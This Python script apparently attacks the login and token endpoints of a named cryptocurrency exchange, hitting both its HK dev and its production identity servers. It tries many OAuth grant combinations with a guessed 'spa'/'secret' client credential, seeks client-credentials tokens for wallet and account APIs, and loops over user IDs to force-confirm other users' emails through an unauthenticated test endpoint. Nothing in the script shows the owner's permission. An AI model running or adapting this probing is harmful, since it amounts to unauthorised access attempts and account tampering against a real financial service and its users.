import requests, json, sys, urllib3
urllib3.disable_warnings()
sys.stdout.reconfigure(encoding='utf-8', errors='replace')
T = 20

EMAIL = "testuser@gmail.com"
PASS = "TestPass123!@#"

print("=" * 70)
print("MX EXCHANGE — LOGIN FLOW VARIANTS")
print("=" * 70)

IDENTITY = "https://identityhkdev.mx.exchange"
ACCT = "https://accounthkdev.mx.exchange"

H_FORM = {"Content-Type": "application/x-www-form-urlencoded", "User-Agent": "Mozilla/5.0"}
H_JSON = {"Content-Type": "application/json", "Accept": "application/json", "User-Agent": "Mozilla/5.0"}

def safe(t, n=400):
    return t[:n].encode('ascii','replace').decode('ascii') if t else ""

# 1. Try Account/Login on HK Dev (PROD gives 500)
print("\n[1] Account Login endpoint...")
login_payloads = [
    {"email": EMAIL, "password": PASS},
    {"Email": EMAIL, "Password": PASS},
    {"username": EMAIL, "password": PASS},
    {"email": EMAIL, "password": PASS, "rememberMe": True},
    {"email": EMAIL, "password": PASS, "captchaToken": ""},
]
for payload in login_payloads:
    r = requests.post(f"{ACCT}/api/Account/Login", json=payload, headers=H_JSON, timeout=T, verify=False)
    if r.status_code != 404:
        print(f"  {json.dumps(payload)[:60]} => {r.status_code} {safe(r.text, 300)}")
        if r.status_code in (200, 201):
            print(f"  [!!!] LOGIN SUCCESS")
            try:
                data = r.json()
                print(json.dumps(data, indent=2)[:1000])
            except:
                pass

# 2. Token endpoint with custom fields from JS
print("\n[2] Token endpoint variants...")
token_combos = [
    # Standard password grant with email instead of username
    {"client_id": "spa", "client_secret": "secret", "grant_type": "password", "email": EMAIL, "password": PASS},
    {"client_id": "spa", "client_secret": "secret", "grant_type": "password", "email": EMAIL, "token": PASS},
    {"client_id": "spa", "client_secret": "secret", "grant_type": "password", "email": EMAIL, "token": PASS, "provider": "local"},
    {"client_id": "spa", "client_secret": "secret", "grant_type": "password", "email": EMAIL, "token": PASS, "provider": "Credentials"},
    {"client_id": "spa", "client_secret": "secret", "grant_type": "password", "email": EMAIL, "token": PASS, "provider": "Email", "code": ""},
    {"client_id": "spa", "client_secret": "secret", "grant_type": "password", "username": EMAIL, "password": PASS},
    # Custom "external" grant type (listed in supported grants)
    {"client_id": "spa", "client_secret": "secret", "grant_type": "external", "email": EMAIL, "token": PASS, "provider": "local"},
    {"client_id": "spa", "client_secret": "secret", "grant_type": "external", "email": EMAIL, "token": PASS, "provider": "Credentials"},
    # Client credentials (no user)
    {"client_id": "spa", "client_secret": "secret", "grant_type": "client_credentials", "scope": "accountApi"},
    {"client_id": "spa", "client_secret": "secret", "grant_type": "client_credentials", "scope": "walletApi"},
    {"client_id": "spa", "client_secret": "secret", "grant_type": "client_credentials"},
]

for combo in token_combos:
    r = requests.post(f"{IDENTITY}/connect/token", data=combo, headers=H_FORM, timeout=T, verify=False)
    desc = "&".join(f"{k}={v}" for k,v in combo.items() if k not in ("client_id","client_secret"))[:80]
    if "Not allowed" not in r.text and "invalid_client" not in r.text:
        print(f"  [{r.status_code}] {desc}")
        print(f"         {safe(r.text, 300)}")
    elif r.status_code == 200:
        print(f"  [!!!] {desc} => {r.status_code}")
        print(f"  {safe(r.text, 500)}")

# 3. ALSO try PROD identity
print("\n[3] PROD identity token...")
IDENTITY_PROD = "https://identity.mx.exchange"
for combo in [
    {"client_id": "spa", "client_secret": "secret", "grant_type": "client_credentials"},
    {"client_id": "spa", "client_secret": "secret", "grant_type": "client_credentials", "scope": "accountApi walletApi"},
    {"client_id": "spa", "client_secret": "secret", "grant_type": "password", "username": EMAIL, "password": PASS},
    {"client_id": "spa", "client_secret": "secret", "grant_type": "password", "email": EMAIL, "password": PASS},
]:
    r = requests.post(f"{IDENTITY_PROD}/connect/token", data=combo, headers=H_FORM, timeout=T, verify=False)
    desc = "&".join(f"{k}={v}" for k,v in combo.items() if k not in ("client_id","client_secret"))[:80]
    print(f"  [{r.status_code}] {desc}")
    print(f"         {safe(r.text, 300)}")

# 4. Try to find UserInfo for registered user
print("\n[4] User enumeration...")
for uid in [1, 2, 3, 4, 5]:
    # Confirm email via TestIntegrationEvent (already worked without auth)
    r = requests.post(f"{ACCT}/api/TestIntegrationEvent/ConfirmEmail", json={"userId": uid},
                     headers=H_JSON, timeout=T, verify=False)
    print(f"  ConfirmEmail(userId={uid}) => {r.status_code}")

# 5. Try login after confirming ALL user emails
print("\n[5] Login after email confirmation...")
for combo in [
    {"client_id": "spa", "client_secret": "secret", "grant_type": "password", "username": EMAIL, "password": PASS},
    {"client_id": "spa", "client_secret": "secret", "grant_type": "password", "email": EMAIL, "password": PASS},
    {"client_id": "spa", "client_secret": "secret", "grant_type": "password", "email": EMAIL, "token": PASS, "provider": "local"},
]:
    r = requests.post(f"{IDENTITY}/connect/token", data=combo, headers=H_FORM, timeout=T, verify=False)
    desc = "&".join(f"{k}={v}" for k,v in combo.items() if k not in ("client_id","client_secret"))[:80]
    print(f"  [{r.status_code}] {desc}")
    print(f"         {safe(r.text, 300)}")

print(f"\n{'='*70}")
print("DONE")
